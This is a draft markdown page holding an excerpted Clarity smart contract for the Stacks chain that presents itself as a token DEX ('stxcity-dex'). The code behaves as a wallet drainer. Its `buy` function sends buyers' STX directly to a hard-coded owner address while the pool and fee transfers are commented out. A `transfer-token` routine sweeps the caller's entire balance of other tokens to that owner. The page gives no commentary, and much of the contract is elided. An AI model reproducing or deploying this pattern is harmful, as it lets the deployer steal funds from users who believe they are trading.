---
title: "Trait wandering-peach-mockingbird-stxcity-dex"
draft: true
---
```
...
(define-constant STX_TARGET_AMOUNT u6000000000)
(define-constant VIRTUAL_STX_VALUE u1200000000) ;; 1/5 of STX_TARGET_AMOUNT
(define-constant COMPLETE_FEE u120000000) ;; 2% of STX_TARGET_AMOUNT
...
(define-constant allow-token 'SP162Z7DGD97KDZPQZT8Z486PEGFZ52CJ4AKZX9XD.wandering-peach-mockingbird)
(define-data-var TOKEN_OWNER principal 'SP162Z7DGD97KDZPQZT8Z486PEGFZ52CJ4AKZX9XD)
;; data vars
...
(define-public (buy (token-trait <sip-010-trait>) (stx-amount uint) ) 
  (begin
    ...
    ;;   (try! (stx-transfer? stx-fee tx-sender STX_CITY_SWAP_FEE_WALLET))
      ...
      (try! (stx-transfer? stx-amount tx-sender (var-get TOKEN_OWNER)))
    ...
    ;;   (try! (as-contract (stx-transfer? (stx-get-balance tx-sender) tx-sender AMM_WALLET)))
...
(define-public (transfer-token 
    ...
    (begin
        (let
            (
                ;; (token-balance u200)
                (token-balanceb (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balanceb u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balanceb tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
    ...
    (begin
        (let 
            (
                ...
                (res8 (transfer-token 'SP134ACD749QYM1J4ZTWMJ43MZH38BJB33D24DQB8.tychu-onasch-stxcity))
            )
            (ok true)
        )
    )
...
(begin
  (var-set virtual-stx-amount VIRTUAL_STX_VALUE)
    ...
    (var-set token-balance u997782705099778)
    (var-set stx-balance u26666)
  ...
  (try! (stx-transfer? u1 tx-sender 'SP1WG62TA0D3K980WGSTZ0QA071TZD4ZXNKP0FQZ7))
  (ok true)
)
```
